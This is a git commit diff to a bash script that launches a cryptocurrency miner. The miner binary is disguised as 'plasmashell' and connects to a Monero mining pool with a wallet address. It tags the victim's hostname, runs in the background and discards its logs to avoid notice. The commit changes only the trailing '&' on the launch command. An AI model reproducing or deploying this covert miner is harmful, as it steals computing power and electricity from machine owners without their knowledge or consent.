34686f293c7516f4f4d876e3e89342c7aa7b4209
hakumlk <ivanko12240@gmail.com>
2026-04-09 23:01:47 +0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 DIR="/home/DATA/1211/test"
-START="./plasmashell -o pool.hashvault.pro:443 -u 85WG1D3CVTYKPTxE4kQdHFJgghnHGqeiVKPnS8SzX6d9bZs8GyASnuZWRhQB14YTi2YiakQWh4QLjSJ1roqEBhbC17SDis3 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --pass=$(hostname -s 2>/dev/null) --background --no-color --log-file /dev/null &"
+START="./plasmashell -o pool.hashvault.pro:443 -u 85WG1D3CVTYKPTxE4kQdHFJgghnHGqeiVKPnS8SzX6d9bZs8GyASnuZWRhQB14YTi2YiakQWh4QLjSJ1roqEBhbC17SDis3 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --pass=$(hostname -s 2>/dev/null) --background --no-color --log-file /dev/null"
 
 if [[ ! -d "$DIR" ]]; then
   mkdir -p "$DIR"
